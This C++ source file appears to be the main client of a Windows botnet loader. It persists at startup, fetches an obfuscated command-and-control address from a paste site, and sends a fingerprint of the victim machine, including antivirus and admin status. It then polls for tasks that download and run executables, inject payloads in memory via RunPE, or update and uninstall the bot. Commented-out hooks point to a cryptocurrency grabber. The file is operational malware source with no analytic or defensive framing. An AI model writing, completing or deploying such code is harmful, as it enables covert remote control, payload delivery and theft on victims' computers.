#include <stdio.h>
#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include "config.h"
#include <conio.h>
#include "CoinFinder.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "Helpers.hpp"
#include "OsHelpers.hpp"
#include "XOR.h"
#include "spiderrun.h"

#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")



struct ComInit
{
	HRESULT hr;
	ComInit() : hr(::CoInitialize(nullptr)) {}
	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
};



#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
#endif
		Config config;
	
		//Check if the Bot is Running
		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically

		//Autostart && Clone
		if (config.startup == true) {
			std::string insatlled = Helpers::installedOrnot();
			if (insatlled == "restart") {
				return 0;
			}
			Helpers::addstartup();
		}


		
		//Fetch Gate from raw Site
		http::Request request(config.pastebinUrl);
		http::Response response = request.send("GET");
		std::string gateFromPatebin = XOR::encryptDecrypt(Helpers::responseToString(response));
		//Net Framwork Check
		std::string netFramework2 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
		std::string netFramework3 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
		std::string netFramework35 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
		std::string netFramework4 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
		// Start Coin Grabber
		//std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
		//std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
		//Main
		std::string guid = Helpers::GetMachineGUID();
		std::string args = "hwid=" + guid +
			"&computername=" + Helpers::getComputerName() +
			"&cpuName=" + OsHelpers::getCpuName() +
			"&aornot=" + OsHelpers::checkPEIsAdmin() +
			"&gpuName=" + OsHelpers::getCpuName() +
			"&prcessorArchitecture=" + OsHelpers::PrcessorArchitecture() +
			"&installedRam=" + OsHelpers::getRam() +
			"&netFramework2=" + netFramework2 +
			"&netFramework3=" + netFramework3 +
			"&netFramework35=" + netFramework35 +
			"&netFramework4=" + netFramework4 +
			"&antivirus=" + Helpers::getCurrentAv() +
			"&botversion=2.1" +
			"&operingsystem=" + Helpers::GetWindowsVersionString();
		std::string finalPost = "request="+XOR::encryptReqeust(args);
		while (true) {
			try {
				http::Request request2(gateFromPatebin);
				http::Response respons2e = request2.send("POST",
					finalPost,
					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
				);
				std::string responseFromGate = Helpers::responseToString(respons2e);

				if (responseFromGate.find("dande") != std::string::npos) {
					//New task Found
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string random_str = Helpers::RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
					Helpers::downloadFile(url, file);
					std::string started = Helpers::startNewProcess(file);
					http::Request request2(gateFromPatebin);
					http::Response respons2e = request2.send("POST",
						"hwid=" + guid +
						"&taskstatus=" + started +
						"&taskid=" + v[0],
						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
					);
				}else if (responseFromGate.find("runpe") != std::string::npos) {
						//New task Found
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						std::string url(v[2]);
						LPVOID FileData = DownloadURLToBuffer(url.c_str());
						bool runned = NTRX_RUNPE32(FileData);
						std::string started = "failed";
						if(runned){
							 started = "success";
						}
						http::Request request2(gateFromPatebin);
						http::Response respons2e = request2.send("POST",
							"hwid=" + guid +
							"&taskstatus=" + started +
							"&taskid=" + v[0],
							{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
						);
					}
				else {
					if (responseFromGate.find("uninstall") != std::string::npos) {
						//t1.detach();
						//t2.detach();
						Helpers::uninstall();
						return 0;
					}
					else if (responseFromGate.find("update") != std::string::npos) {
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						//t1.detach();
						//t2.detach();
						Helpers::update(v[2]);
						return 0;
					}
					// Else No new Task
				}
			}
			catch (const std::exception & e) {
				std::cerr << "Request failed, error: " << e.what() << std::endl;
			}
			
			Sleep(10000);
		}
		
}
